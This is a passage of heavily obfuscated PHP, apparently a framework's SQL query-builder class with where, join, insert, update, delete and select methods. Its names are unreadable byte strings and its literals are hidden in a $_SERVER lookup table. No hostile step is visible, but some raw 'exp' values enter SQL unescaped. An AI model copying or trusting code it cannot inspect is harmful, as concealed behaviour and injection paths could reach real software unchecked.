$³€ÏÛÄù[$¯¡ÃóÊ[974]][$è§Ô£÷Ä] : $³€ÏÛÄù[$¯¡ÃóÊ[974]][0], $¯¡ÃóÊ[975] => isset($³€ÏÛÄù[$¯¡ÃóÊ[975]][$è§Ô£÷Ä]) ? $³€ÏÛÄù[$¯¡ÃóÊ[975]][$è§Ô£÷Ä] : $³€ÏÛÄù[$¯¡ÃóÊ[975]][0], $¯¡ÃóÊ[21] => isset($³€ÏÛÄù[$¯¡ÃóÊ[21]][$è§Ô£÷Ä]) ? $³€ÏÛÄù[$¯¡ÃóÊ[21]][$è§Ô£÷Ä] : $³€ÏÛÄù[$¯¡ÃóÊ[21]][0], $¯¡ÃóÊ[1004] => isset($³€ÏÛÄù[$¯¡ÃóÊ[1004]][$è§Ô£÷Ä]) ? $³€ÏÛÄù[$¯¡ÃóÊ[1004]][$è§Ô£÷Ä] : $³€ÏÛÄù[$¯¡ÃóÊ[1004]][0], $¯¡ÃóÊ[17] => isset($³€ÏÛÄù[$¯¡ÃóÊ[17]][$è§Ô£÷Ä]) ? $³€ÏÛÄù[$¯¡ÃóÊ[17]][$è§Ô£÷Ä] : $³€ÏÛÄù[$¯¡ÃóÊ[17]][0]); return $this->connect($¸¨ñÓ®±, $è§Ô£÷Ä); } public function parseDSN($ş—–‘¤“) { $¸ÃÔ‰ =& $_SERVER[†ûãı«°]; if (empty($ş—–‘¤“)) { return !1; } $şéóª = parse_url($ş—–‘¤“); if ($şéóª[$¸ÃÔ‰[207]]) { $÷ÊµĞù¤ = array($¸ÃÔ‰[1049] => $şéóª[$¸ÃÔ‰[207]], $¸ÃÔ‰[976] => isset($şéóª[$¸ÃÔ‰[669]]) ? $şéóª[$¸ÃÔ‰[669]] : $¸ÃÔ‰[12], $¸ÃÔ‰[977] => isset($şéóª[$¸ÃÔ‰[1073]]) ? $şéóª[$¸ÃÔ‰[1073]] : $¸ÃÔ‰[12], $¸ÃÔ‰[974] => isset($şéóª[$¸ÃÔ‰[208]]) ? $şéóª[$¸ÃÔ‰[208]] : $¸ÃÔ‰[12], $¸ÃÔ‰[975] => isset($şéóª[$¸ÃÔ‰[209]]) ? $şéóª[$¸ÃÔ‰[209]] : $¸ÃÔ‰[12], $¸ÃÔ‰[21] => isset($şéóª[$¸ÃÔ‰[87]]) ? substr($şéóª[$¸ÃÔ‰[87]], 1) : $¸ÃÔ‰[12]); } else { preg_match($¸ÃÔ‰[1074], trim($ş—–‘¤“), $Ê×Ğåø€); $÷ÊµĞù¤ = array($¸ÃÔ‰[1049] => $Ê×Ğåø€[1], $¸ÃÔ‰[976] => $Ê×Ğåø€[2], $¸ÃÔ‰[977] => $Ê×Ğåø€[3], $¸ÃÔ‰[974] => $Ê×Ğåø€[4], $¸ÃÔ‰[975] => $Ê×Ğåø€[5], $¸ÃÔ‰[21] => $Ê×Ğåø€[6]); } $÷ÊµĞù¤[$¸ÃÔ‰[1004]] = $¸ÃÔ‰[12]; return $÷ÊµĞù¤; } protected function debug() { $ßË©—¨ª =& $_SERVER[†ûãı«°]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ßË©—¨ª[1075]; if (think_config($ßË©—¨ª[1076])) { think_status($ßË©—¨ª[1077]); think_trace($this->queryStr . $ßË©—¨ª[1078] . think_status($ßË©—¨ª[24], $ßË©—¨ª[1077], 6) . $ßË©—¨ª[1079], $ßË©—¨ª[12], $ßË©—¨ª[1080]); } } protected function parseLock($¨Ş‡ì£ = false) { $ä„ÃÎÓÅ =& $_SERVER[†ûãı«°]; if (!$¨Ş‡ì£) { return $ä„ÃÎÓÅ[12]; } if ($ä„ÃÎÓÅ[1006] == $this->dbType) { return $ä„ÃÎÓÅ[1081]; } return $ä„ÃÎÓÅ[1082]; } protected function parseSet($“«Û›ü) { $¡²·ôÂ¾ =& $_SERVER[†ûãı«°]; foreach ($“«Û›ü as $×Øù¯á³ => $Ùï º¡) { if (is_array($Ùï º¡) && $¡²·ôÂ¾[374] == $Ùï º¡[0]) { $ğìÉ¦–­[] = $this->parseKey($×Øù¯á³) . $¡²·ôÂ¾[508] . $Ùï º¡[1]; } elseif (is_scalar($Ùï º¡) || is_null($Ùï º¡)) { $ğìÉ¦–­[] = $this->parseKey($×Øù¯á³) . $¡²·ôÂ¾[508] . $this->parseValue($Ùï º¡); } } return $¡²·ôÂ¾[1083] . implode($¡²·ôÂ¾[50], $ğìÉ¦–­); } protected function bindParam($ëÕ„, $Ş¤²©ğ) { $this->bind[$_SERVER[†ûãı«°][4] . $ëÕ„] = $Ş¤²©ğ; } protected function parseBind($ü„ú²ÌÒ) { $ü„ú²ÌÒ = array_merge($this->bind, $ü„ú²ÌÒ); $this->bind = array(); return $ü„ú²ÌÒ; } function parseKey(&$€Š­Àû, $®óû×Ø = true) { if ($®óû×Ø) { $€Š­Àû = $this->parseKeyCheck($€Š­Àû); } return $€Š­Àû; } function parseKeyCheck($À¶ôĞ²Ÿ) { $ÛŠáéá¨ =& $_SERVER[†ûãı«°]; $À¶ôĞ²Ÿ = trim($À¶ôĞ²Ÿ); if (!preg_match($ÛŠáéá¨[1084], $À¶ôĞ²Ÿ)) { think_exception($ÛŠáéá¨[1085] . $À¶ôĞ²Ÿ); } return $À¶ôĞ²Ÿ; } protected function parseValue($ôµâéŞ) { $ŸÏÒÚÚ‡ =& $_SERVER[†ûãı«°]; if (is_string($ôµâéŞ)) { $ôµâéŞ = $ŸÏÒÚÚ‡[1045] . $this->escapeString($ôµâéŞ) . $ŸÏÒÚÚ‡[1045]; } elseif (isset($ôµâéŞ[0]) && is_string($ôµâéŞ[0]) && strtolower($ôµâéŞ[0]) == $ŸÏÒÚÚ‡[374]) { $ôµâéŞ = $this->escapeString($ôµâéŞ[1]); } elseif (is_array($ôµâéŞ)) { $ôµâéŞ = array_map(array($this, $ŸÏÒÚÚ‡[1046]), $ôµâéŞ); } elseif (is_bool($ôµâéŞ)) { $ôµâéŞ = $ôµâéŞ ? $ŸÏÒÚÚ‡[91] : $ŸÏÒÚÚ‡[230]; } elseif (is_null($ôµâéŞ)) { $ôµâéŞ = $ŸÏÒÚÚ‡[106]; } return $ôµâéŞ; } protected function parseField($àåŸªîŞ) { $‹İİ®Ÿœ =& $_SERVER[†ûãı«°]; if (is_string($àåŸªîŞ) && strpos($àåŸªîŞ, $‹İİ®Ÿœ[50])) { $àåŸªîŞ = explode($‹İİ®Ÿœ[50], $àåŸªîŞ); } if (is_array($àåŸªîŞ)) { $¥³ Û¾ü = array(); foreach ($àåŸªîŞ as $šá«ƒÙ‘ => $ÕÚÇàÁ«) { if (!is_numeric($šá«ƒÙ‘)) { $¥³ Û¾ü[] = $this->parseKey($šá«ƒÙ‘, !1) . $‹İİ®Ÿœ[1086] . $this->parseKey($ÕÚÇàÁ«); } else { $¥³ Û¾ü[] = $this->parseKey($ÕÚÇàÁ«); } } $èáø¬‹‘ = implode($‹İİ®Ÿœ[50], $¥³ Û¾ü); } elseif (is_string($àåŸªîŞ) && !empty($àåŸªîŞ)) { $èáø¬‹‘ = $àåŸªîŞ; } else { $èáø¬‹‘ = $‹İİ®Ÿœ[222]; } return $èáø¬‹‘; } protected function parseTable($Ä¨øõì±) { $ ä¸…Èâ =& $_SERVER[†ûãı«°]; if (is_array($Ä¨øõì±)) { $ ùÀÚ³“ = array(); foreach ($Ä¨øõì± as $œ‘ÓºÂÙ => $ İšÉÜ) { if (!is_numeric($œ‘ÓºÂÙ)) { $ ùÀÚ³“[] = $this->parseKey($œ‘ÓºÂÙ) . $ ä¸…Èâ[53] . $this->parseKey($ İšÉÜ); } else { $ ùÀÚ³“[] = $this->parseKey($œ‘ÓºÂÙ); } } $Ä¨øõì± = $ ùÀÚ³“; } elseif (is_string($Ä¨øõì±)) { if (strstr($Ä¨øõì±, $ ä¸…Èâ[53])) { return $Ä¨øõì±; } $Ä¨øõì± = explode($ ä¸…Èâ[50], $Ä¨øõì±); array_walk($Ä¨øõì±, array($this, $ ä¸…Èâ[994])); } return $ ä¸…Èâ[988] . trim(implode($ ä¸…Èâ[1087], $Ä¨øõì±), $ ä¸…Èâ[463]) . $ ä¸…Èâ[988]; } protected function parseWhere($ğ”×Ôüò) { $ïó½û® =& $_SERVER[†ûãı«°]; $¯ªç’™« = $ïó½û®[12]; if (is_string($ğ”×Ôüò)) { $¯ªç’™« = $ğ”×Ôüò; } else { $ÔŸ«ÀùĞ = isset($ğ”×Ôüò[$ïó½û®[1088]]) ? strtoupper($ğ”×Ôüò[$ïó½û®[1088]]) : $ïó½û®[12]; if (in_array($ÔŸ«ÀùĞ, array($ïó½û®[1089], $ïó½û®[1090], $ïó½û®[1091]))) { $ÔŸ«ÀùĞ = $ïó½û®[53] . $ÔŸ«ÀùĞ . $ïó½û®[53]; unset($ğ”×Ôüò[$ïó½û®[1088]]); } else { $ÔŸ«ÀùĞ = $ïó½û®[1092]; } foreach ($ğ”×Ôüò as $«¡­—îî => $ı¡“Ëç¨) { $¯ªç’™« .= $ïó½û®[356]; if (is_numeric($«¡­—îî)) { $«¡­—îî = $ïó½û®[1093]; } if (0 === strpos($«¡­—îî, $ïó½û®[11])) { $¯ªç’™« .= $this->parseThinkWhere($«¡­—îî, $ı¡“Ëç¨); } else { if (!preg_match($ïó½û®[1094], trim($«¡­—îî))) { think_exception(think_lang($ïó½û®[1095]) . $ïó½û®[4] . $«¡­—îî); } $ßÛƒÖ£ = is_array($ı¡“Ëç¨) && isset($ı¡“Ëç¨[$ïó½û®[1096]]); $«¡­—îî = trim($«¡­—îî); if (strpos($«¡­—îî, $ïó½û®[214])) { $¤ÄÍòÁ› = explode($ïó½û®[214], $«¡­—îî); $Äœ÷âö² = array(); foreach ($¤ÄÍòÁ› as $Øú‹‡Çã => $±§µô€ß) { $–•¯ßğÑ = $ßÛƒÖ£ ? $ı¡“Ëç¨[$Øú‹‡Çã] : $ı¡“Ëç¨; $Äœ÷âö²[] = $ïó½û®[339] . $this->parseWhereItem($this->parseKey($±§µô€ß), $–•¯ßğÑ) . $ïó½û®[993]; } $¯ªç’™« .= implode($ïó½û®[1097], $Äœ÷âö²); } elseif (strpos($«¡­—îî, $ïó½û®[286])) { $¤ÄÍòÁ› = explode($ïó½û®[286], $«¡­—îî); $Äœ÷âö² = array(); foreach ($¤ÄÍòÁ› as $Øú‹‡Çã => $±§µô€ß) { $–•¯ßğÑ = $ßÛƒÖ£ ? $ı¡“Ëç¨[$Øú‹‡Çã] : $ı¡“Ëç¨; $Äœ÷âö²[] = $ïó½û®[339] . $this->parseWhereItem($this->parseKey($±§µô€ß), $–•¯ßğÑ) . $ïó½û®[993]; } $¯ªç’™« .= implode($ïó½û®[1092], $Äœ÷âö²); } else { $¯ªç’™« .= $this->parseWhereItem($this->parseKey($«¡­—îî), $ı¡“Ëç¨); } } $¯ªç’™« .= $ïó½û®[357] . $ÔŸ«ÀùĞ; } $¯ªç’™« = substr($¯ªç’™«, 0, -strlen($ÔŸ«ÀùĞ)); } return empty($¯ªç’™«) ? $ïó½û®[12] : $ïó½û®[1098] . $¯ªç’™«; } protected function parseWhereItem($İñëéä, $òã‹ù£Ü) { $Ğ¶ÒÆÎõ =& $_SERVER[†ûãı«°]; $êÏƒº© = $Ğ¶ÒÆÎõ[12]; if (is_array($òã‹ù£Ü)) { if (is_string($òã‹ù£Ü[0])) { $ÜÊÖŞÀÉ = strtolower($òã‹ù£Ü[0]); if (in_array($òã‹ù£Ü[0], array($Ğ¶ÒÆÎõ[508], $Ğ¶ÒÆÎõ[1099], $Ğ¶ÒÆÎõ[1100], $Ğ¶ÒÆÎõ[1101], $Ğ¶ÒÆÎõ[1102], $Ğ¶ÒÆÎõ[1103]))) { $êÏƒº© .= $İñëéä . $Ğ¶ÒÆÎõ[53] . $òã‹ù£Ü[0] . $Ğ¶ÒÆÎõ[53] . $this->parseValue($òã‹ù£Ü[1]); } elseif (preg_match($Ğ¶ÒÆÎõ[1104], $òã‹ù£Ü[0])) { $êÏƒº© .= $İñëéä . $Ğ¶ÒÆÎõ[53] . $this->exp[$ÜÊÖŞÀÉ] . $Ğ¶ÒÆÎõ[53] . $this->parseValue($òã‹ù£Ü[1]); } elseif (preg_match($Ğ¶ÒÆÎõ[1105], $òã‹ù£Ü[0])) { if (is_array($òã‹ù£Ü[1])) { $ÈÇÉˆ„Á = isset($òã‹ù£Ü[2]) ? strtoupper($òã‹ù£Ü[2]) : $Ğ¶ÒÆÎõ[1090]; if (in_array($ÈÇÉˆ„Á, array($Ğ¶ÒÆÎõ[1089], $Ğ¶ÒÆÎõ[1090], $Ğ¶ÒÆÎõ[1091]))) { $¾ã¾à›¨ = array(); foreach ($òã‹ù£Ü[1] as $ºä®¶Àß) { $¾ã¾à›¨[] = $İñëéä . $Ğ¶ÒÆÎõ[53] . $this->exp[$ÜÊÖŞÀÉ] . $Ğ¶ÒÆÎõ[53] . $this->parseValue($ºä®¶Àß); } $êÏƒº© .= $Ğ¶ÒÆÎõ[339] . implode($Ğ¶ÒÆÎõ[53] . $ÈÇÉˆ„Á . $Ğ¶ÒÆÎõ[53], $¾ã¾à›¨) . $Ğ¶ÒÆÎõ[993]; } } else { $êÏƒº© .= $İñëéä . $Ğ¶ÒÆÎõ[53] . $this->exp[$ÜÊÖŞÀÉ] . $Ğ¶ÒÆÎõ[53] . $this->parseValue($òã‹ù£Ü[1]); } } elseif ($Ğ¶ÒÆÎõ[374] == $ÜÊÖŞÀÉ) { $êÏƒº© .= $Ğ¶ÒÆÎõ[991] . $İñëéä . $Ğ¶ÒÆÎõ[53] . $òã‹ù£Ü[1] . $Ğ¶ÒÆÎõ[1106]; } elseif (preg_match($Ğ¶ÒÆÎõ[1107], $òã‹ù£Ü[0])) { $êÏƒº© .= $òã‹ù£Ü[0]; } elseif (preg_match($Ğ¶ÒÆÎõ[1108], $òã‹ù£Ü[0])) { if (isset($òã‹ù£Ü[2]) && $Ğ¶ÒÆÎõ[374] == $òã‹ù£Ü[2]) { $êÏƒº© .= $İñëéä . $Ğ¶ÒÆÎõ[53] . $this->exp[$ÜÊÖŞÀÉ] . $Ğ¶ÒÆÎõ[53] . $òã‹ù£Ü[1]; } else { if (is_string($òã‹ù£Ü[1])) { $òã‹ù£Ü[1] = explode($Ğ¶ÒÆÎõ[50], $òã‹ù£Ü[1]); } $†â¾ŠÀ = implode($Ğ¶ÒÆÎõ[50], $this->parseValue($òã‹ù£Ü[1])); $êÏƒº© .= $İñëéä . $Ğ¶ÒÆÎõ[53] . $this->exp[$ÜÊÖŞÀÉ] . $Ğ¶ÒÆÎõ[991] . $†â¾ŠÀ . $Ğ¶ÒÆÎõ[993]; } } elseif (preg_match($Ğ¶ÒÆÎõ[1109], $òã‹ù£Ü[0])) { $¹üÂµ±Ë = is_string($òã‹ù£Ü[1]) ? explode($Ğ¶ÒÆÎõ[50], $òã‹ù£Ü[1]) : $òã‹ù£Ü[1]; $êÏƒº© .= $Ğ¶ÒÆÎõ[991] . $İñëéä . $Ğ¶ÒÆÎõ[53] . $this->exp[$ÜÊÖŞÀÉ] . $Ğ¶ÒÆÎõ[53] . $this->parseValue($¹üÂµ±Ë[0]) . $Ğ¶ÒÆÎõ[1092] . $this->parseValue($¹üÂµ±Ë[1]) . $Ğ¶ÒÆÎõ[357]; } else { think_exception(think_lang($Ğ¶ÒÆÎõ[1095]) . $Ğ¶ÒÆÎõ[4] . $òã‹ù£Ü[0]); } } else { $¬ºó©Ñ = count($òã‹ù£Ü); $ì³Ä´‰Î = $Ğ¶ÒÆÎõ[12]; if (is_string($òã‹ù£Ü[$¬ºó©Ñ - 1])) { $ì³Ä´‰Î = isset($òã‹ù£Ü[$¬ºó©Ñ - 1]) ? strtoupper($òã‹ù£Ü[$¬ºó©Ñ - 1]) : $Ğ¶ÒÆÎõ[12]; if (in_array($ì³Ä´‰Î, array($Ğ¶ÒÆÎõ[1089], $Ğ¶ÒÆÎõ[1090], $Ğ¶ÒÆÎõ[1091]))) { $¬ºó©Ñ = $¬ºó©Ñ - 1; } } else { $ì³Ä´‰Î = $Ğ¶ÒÆÎõ[1089]; } for ($´±Á›Ûß = 0; $´±Á›Ûß < $¬ºó©Ñ; $´±Á›Ûß++) { $¹üÂµ±Ë = is_array($òã‹ù£Ü[$´±Á›Ûß]) ? $òã‹ù£Ü[$´±Á›Ûß][1] : $òã‹ù£Ü[$´±Á›Ûß]; if ($Ğ¶ÒÆÎõ[374] == strtolower($òã‹ù£Ü[$´±Á›Ûß][0])) { $êÏƒº© .= $Ğ¶ÒÆÎõ[339] . $İñëéä . $Ğ¶ÒÆÎõ[53] . $¹üÂµ±Ë . $Ğ¶ÒÆÎõ[1106] . $ì³Ä´‰Î . $Ğ¶ÒÆÎõ[53]; } else { $õ¦ÒèŞé = is_array($òã‹ù£Ü[$´±Á›Ûß]) ? $this->exp[strtolower($òã‹ù£Ü[$´±Á›Ûß][0])] : $Ğ¶ÒÆÎõ[508]; if (!$õ¦ÒèŞé && is_array($òã‹ù£Ü[$´±Á›Ûß]) && in_array($òã‹ù£Ü[$´±Á›Ûß][0], array($Ğ¶ÒÆÎõ[508], $Ğ¶ÒÆÎõ[1099], $Ğ¶ÒÆÎõ[1100], $Ğ¶ÒÆÎõ[1101], $Ğ¶ÒÆÎõ[1102], $Ğ¶ÒÆÎõ[1103]))) { $õ¦ÒèŞé = $òã‹ù£Ü[$´±Á›Ûß][0]; } $êÏƒº© .= $Ğ¶ÒÆÎõ[339] . $İñëéä . $Ğ¶ÒÆÎõ[53] . $õ¦ÒèŞé . $Ğ¶ÒÆÎõ[53] . $this->parseValue($¹üÂµ±Ë) . $Ğ¶ÒÆÎõ[1106] . $ì³Ä´‰Î . $Ğ¶ÒÆÎõ[53]; } } $êÏƒº© = substr($êÏƒº©, 0, -4); } } else { $êÏƒº© .= $İñëéä . $Ğ¶ÒÆÎõ[1110] . $this->parseValue($òã‹ù£Ü); } return $êÏƒº©; } protected function parseThinkWhere($ÍéóÁ£, $§Êæ¿ğ…) { $ù¤Ü‘îÏ =& $_SERVER[†ûãı«°]; $ÈÙÛá“ã = $ù¤Ü‘îÏ[12]; switch ($ÍéóÁ£) { case $ù¤Ü‘îÏ[429]: $ÈÙÛá“ã = $§Êæ¿ğ…; break; case $ù¤Ü‘îÏ[1093]: $ÈÙÛá“ã = is_string($§Êæ¿ğ…) ? $§Êæ¿ğ… : substr($this->parseWhere($§Êæ¿ğ…), 6); break; case $ù¤Ü‘îÏ[1111]: parse_str($§Êæ¿ğ…, $ğ×°ò‚³); if (isset($ğ×°ò‚³[$ù¤Ü‘îÏ[1088]])) { $ü’…¢³ = $ù¤Ü‘îÏ[53] . strtoupper($ğ×°ò‚³[$ù¤Ü‘îÏ[1088]]) . $ù¤Ü‘îÏ[53]; unset($ğ×°ò‚³[$ù¤Ü‘îÏ[1088]]); } else { $ü’…¢³ = $ù¤Ü‘îÏ[1092]; } $Ğş‹«©› = array(); foreach ($ğ×°ò‚³ as $ûâû€Ìï => $ş£‚æİô) { $Ğş‹«©›[] = $this->parseKey($ûâû€Ìï) . $ù¤Ü‘îÏ[1110] . $this->parseValue($ş£‚æİô); } $ÈÙÛá“ã = implode($ü’…¢³, $Ğş‹«©›); break; } return $ÈÙÛá“ã; } protected function parseLimit($èºéİ—«) { $ÕŒï¶ÄŒ =& $_SERVER[†ûãı«°]; return !empty($èºéİ—«) ? $ÕŒï¶ÄŒ[51] . $èºéİ—« . $ÕŒï¶ÄŒ[53] : $ÕŒï¶ÄŒ[12]; } protected function parseJoin($‹»©Ÿè¹) { $™İâÓà =& $_SERVER[†ûãı«°]; $Û™ˆ×Í± = $™İâÓà[12]; if (!empty($‹»©Ÿè¹)) { if (is_array($‹»©Ÿè¹)) { foreach ($‹»©Ÿè¹ as $ï°ŸÒ§Ö => $—´êÀÑ) { if (!1 !== stripos($—´êÀÑ, $™İâÓà[1112])) { $Û™ˆ×Í± .= $™İâÓà[53] . $—´êÀÑ; } else { $Û™ˆ×Í± .= $™İâÓà[1113] . $—´êÀÑ; } } } else { $Û™ˆ×Í± .= $™İâÓà[1113] . $‹»©Ÿè¹; } } $Û™ˆ×Í± = preg_replace($™İâÓà[1114], think_config($™İâÓà[1018]) . $™İâÓà[1115], $Û™ˆ×Í±); return $Û™ˆ×Í±; } protected function parseOrder($ÁÊŞ‰®ü) { $ıãÊÔª— =& $_SERVER[†ûãı«°]; if (is_array($ÁÊŞ‰®ü)) { $²şò¶ñÍ = array(); foreach ($ÁÊŞ‰®ü as $Ò¤¤¤„Œ => $ÀŞàØˆÈ) { if (is_numeric($Ò¤¤¤„Œ)) { $²şò¶ñÍ[] = $this->parseKey($ÀŞàØˆÈ); } else { $ÀŞàØˆÈ = in_array(strtoupper(trim($ÀŞàØˆÈ)), array($ıãÊÔª—[1116], $ıãÊÔª—[1117])) ? $ıãÊÔª—[53] . $ÀŞàØˆÈ : $ıãÊÔª—[12]; if (preg_match($ıãÊÔª—[1118], $Ò¤¤¤„Œ)) { $²şò¶ñÍ[] = $this->parseKey($Ò¤¤¤„Œ) . $ÀŞàØˆÈ; } else { think_exception($ıãÊÔª—[1119] . $Ò¤¤¤„Œ); } } } $ÁÊŞ‰®ü = implode($ıãÊÔª—[50], $²şò¶ñÍ); } return !empty($ÁÊŞ‰®ü) ? $ıãÊÔª—[1120] . $ÁÊŞ‰®ü : $ıãÊÔª—[12]; } protected function parseGroup($ôÓô÷Õ¡) { $óõÂÂÂõ =& $_SERVER[†ûãı«°]; return !empty($ôÓô÷Õ¡) ? $óõÂÂÂõ[1121] . $ôÓô÷Õ¡ : $óõÂÂÂõ[12]; } protected function parseHaving($ÛÕïÙ¼) { $Ğ¶ôíÊ³ =& $_SERVER[†ûãı«°]; return !empty($ÛÕïÙ¼) ? $Ğ¶ôíÊ³[1122] . $ÛÕïÙ¼ : $Ğ¶ôíÊ³[12]; } protected function parseComment($¸€İÉ†) { $Ö•òäš¢ =& $_SERVER[†ûãı«°]; return !empty($¸€İÉ†) ? $Ö•òäš¢[1123] . $¸€İÉ† . $Ö•òäš¢[1124] : $Ö•òäš¢[12]; } protected function parseDistinct($Í•ÊæÁ) { $ÑóÙ› =& $_SERVER[†ûãı«°]; return !empty($Í•ÊæÁ) ? $ÑóÙ›[1125] : $ÑóÙ›[12]; } protected function parseUnion($ğ°ÛÕ©Ì) { $ÛÉ¢‡ĞÏ =& $_SERVER[†ûãı«°]; if (empty($ğ°ÛÕ©Ì)) { return $ÛÉ¢‡ĞÏ[12]; } if (isset($ğ°ÛÕ©Ì[$ÛÉ¢‡ĞÏ[425]])) { $Ò¿Ñíã = $ÛÉ¢‡ĞÏ[1126]; unset($ğ°ÛÕ©Ì[$ÛÉ¢‡ĞÏ[425]]); } else { $Ò¿Ñíã = $ÛÉ¢‡ĞÏ[1127]; } foreach ($ğ°ÛÕ©Ì as $ë‹ÖÏĞø) { $àßá¹ìú[] = $Ò¿Ñíã . (is_array($ë‹ÖÏĞø) ? $this->buildSelectSql($ë‹ÖÏĞø) : $ë‹ÖÏĞø); } return implode($ÛÉ¢‡ĞÏ[53], $àßá¹ìú); } public function insert($çŠãßï, $ç£õŸ°© = array(), $”Æ¹ĞÑ = false) { $¿¦˜öûŸ =& $_SERVER[†ûãı«°]; $Òµ¡‚Öğ = $Òé»â‡¬ = array(); $this->model = $ç£õŸ°©[$¿¦˜öûŸ[360]]; foreach ($çŠãßï as $š“æ€Ïó => $Ëâ¶Ã“¤) { if (is_array($Ëâ¶Ã“¤) && $¿¦˜öûŸ[374] == $Ëâ¶Ã“¤[0]) { $Òé»â‡¬[] = $this->parseKey($š“æ€Ïó); $Òµ¡‚Öğ[] = $Ëâ¶Ã“¤[1]; } elseif (is_scalar($Ëâ¶Ã“¤) || is_null($Ëâ¶Ã“¤)) { $Òé»â‡¬[] = $this->parseKey($š“æ€Ïó); $Òµ¡‚Öğ[] = $this->parseValue($Ëâ¶Ã“¤); } } $§Â•‡Å¡ = ($”Æ¹ĞÑ ? $¿¦˜öûŸ[995] : $¿¦˜öûŸ[996]) . $¿¦˜öûŸ[997] . $this->parseTable($ç£õŸ°©[$¿¦˜öûŸ[358]]) . $¿¦˜öûŸ[991] . implode($¿¦˜öûŸ[50], $Òé»â‡¬) . $¿¦˜öûŸ[992] . implode($¿¦˜öûŸ[50], $Òµ¡‚Öğ) . $¿¦˜öûŸ[993]; $§Â•‡Å¡ .= $this->parseLock(isset($ç£õŸ°©[$¿¦˜öûŸ[925]]) ? $ç£õŸ°©[$¿¦˜öûŸ[925]] : !1); $§Â•‡Å¡ .= $this->parseComment(!empty($ç£õŸ°©[$¿¦˜öûŸ[431]]) ? $ç£õŸ°©[$¿¦˜öûŸ[431]] : $¿¦˜öûŸ[12]); return $this->execute($§Â•‡Å¡, $this->parseBind(!empty($ç£õŸ°©[$¿¦˜öûŸ[362]]) ? $ç£õŸ°©[$¿¦˜öûŸ[362]] : array())); } public function selectInsert($ı²¡¦ó, $ŞêÈ¼ş°, $Ú„ÒåÎö = array()) { $ õÀ¤Àâ =& $_SERVER[†ûãı«°]; $this->model = $Ú„ÒåÎö[$ õÀ¤Àâ[360]]; if (is_string($ı²¡¦ó)) { $ı²¡¦ó = explode($ õÀ¤Àâ[50], $ı²¡¦ó); } array_walk($ı²¡¦ó, array($this, $ õÀ¤Àâ[994])); $¹çáòŞË = $ õÀ¤Àâ[1128] . $this->parseTable($ŞêÈ¼ş°) . $ õÀ¤Àâ[991] . implode($ õÀ¤Àâ[50], $ı²¡¦ó) . $ õÀ¤Àâ[1106]; $¹çáòŞË .= $this->buildSelectSql($Ú„ÒåÎö); return $this->execute($¹çáòŞË, $this->parseBind(!empty($Ú„ÒåÎö[$ õÀ¤Àâ[362]]) ? $Ú„ÒåÎö[$ õÀ¤Àâ[362]] : array())); } public function update($ŸÒ¡ôôÍ, $ÛŞÌÔ á) { $®Şˆ’¼ä =& $_SERVER[†ûãı«°]; $this->model = $ÛŞÌÔ á[$®Şˆ’¼ä[360]]; $ê—çÔÒù = $®Şˆ’¼ä[1129] . $this->parseTable($ÛŞÌÔ á[$®Şˆ’¼ä[358]]) . $this->parseSet($ŸÒ¡ôôÍ) . $this->parseWhere(!empty($ÛŞÌÔ á[$®Şˆ’¼ä[354]]) ? $ÛŞÌÔ á[$®Şˆ’¼ä[354]] : $®Şˆ’¼ä[12]) . $this->parseOrder(!empty($ÛŞÌÔ á[$®Şˆ’¼ä[443]]) ? $ÛŞÌÔ á[$®Şˆ’¼ä[443]] : $®Şˆ’¼ä[12]) . $this->parseLimit(!empty($ÛŞÌÔ á[$®Şˆ’¼ä[369]]) ? $ÛŞÌÔ á[$®Şˆ’¼ä[369]] : $®Şˆ’¼ä[12]) . $this->parseLock(isset($ÛŞÌÔ á[$®Şˆ’¼ä[925]]) ? $ÛŞÌÔ á[$®Şˆ’¼ä[925]] : !1) . $this->parseComment(!empty($ÛŞÌÔ á[$®Şˆ’¼ä[431]]) ? $ÛŞÌÔ á[$®Şˆ’¼ä[431]] : $®Şˆ’¼ä[12]); return $this->execute($ê—çÔÒù, $this->parseBind(!empty($ÛŞÌÔ á[$®Şˆ’¼ä[362]]) ? $ÛŞÌÔ á[$®Şˆ’¼ä[362]] : array())); } public function delete($´Š†üåÇ = array()) { $âşòÜ·ò =& $_SERVER[†ûãı«°]; $this->model = $´Š†üåÇ[$âşòÜ·ò[360]]; $ÕÆÒ±¢‘ = $âşòÜ·ò[1130] . $this->parseTable($´Š†üåÇ[$âşòÜ·ò[358]]) . $this->parseWhere(!empty($´Š†üåÇ[$âşòÜ·ò[354]]) ? $´Š†üåÇ[$âşòÜ·ò[354]] : $âşòÜ·ò[12]) . $this->parseOrder(!empty($´Š†üåÇ[$âşòÜ·ò[443]]) ? $´Š†üåÇ[$âşòÜ·ò[443]] : $âşòÜ·ò[12]) . $this->parseLimit(!empty($´Š†üåÇ[$âşòÜ·ò[369]]) ? $´Š†üåÇ[$âşòÜ·ò[369]] : $âşòÜ·ò[12]) . $this->parseLock(isset($´Š†üåÇ[$âşòÜ·ò[925]]) ? $´Š†üåÇ[$âşòÜ·ò[925]] : !1) . $this->parseComment(!empty($´Š†üåÇ[$âşòÜ·ò[431]]) ? $´Š†üåÇ[$âşòÜ·ò[431]] : $âşòÜ·ò[12]); return $this->execute($ÕÆÒ±¢‘, $this->parseBind(!empty($´Š†üåÇ[$âşòÜ·ò[362]]) ? $´Š†üåÇ[$âşòÜ·ò[362]] : array())); } public function select($÷ì¤÷¿Æ = array()) { $ÆÇ¸×à° =& $_SERVER[†ûãı«°]; $this->model = $÷ì¤÷¿Æ[$ÆÇ¸×à°[360]]; $Ã…ÒïÈö = $this->buildSelectSql($÷ì¤÷¿Æ); $Üã¢ß©¸ = isset($÷ì¤÷¿Æ[$ÆÇ¸×à°[426]]) ? $÷ì¤÷¿Æ[$ÆÇ¸×à°[426]] : !1; if ($Üã¢ß©¸) { $–¯Ø™ = is_string($Üã¢ß©¸[$ÆÇ¸×à°[97]]) ? $Üã¢ß©¸[$ÆÇ¸×à°[97]] : $ÆÇ¸×à°[1131] . md5($Ã…ÒïÈö); $Û¡°äŸ± = think_cache($–¯Ø™, $ÆÇ¸×à°[12], $Üã¢ß©¸); if (!1 !== $Û¡°äŸ±) { return $Û¡°äŸ±; } } $•íÈêçô = $this->query($Ã…ÒïÈö, $this->parseBind(!empty($÷ì¤÷¿Æ[$ÆÇ¸×à°[362]]) ? $÷ì¤÷¿Æ[$ÆÇ¸×à°[362]] : array())); if ($Üã¢ß©¸ && !1 !== $•íÈêçô) { think_cache($–¯Ø™, $•íÈêçô, $Üã¢ß©¸); } return $•íÈêçô; } public function buildSelectSql($Õô”„ = array()) { $éş™Ú¥Á =& $_SERVER[†ûãı«°]; if 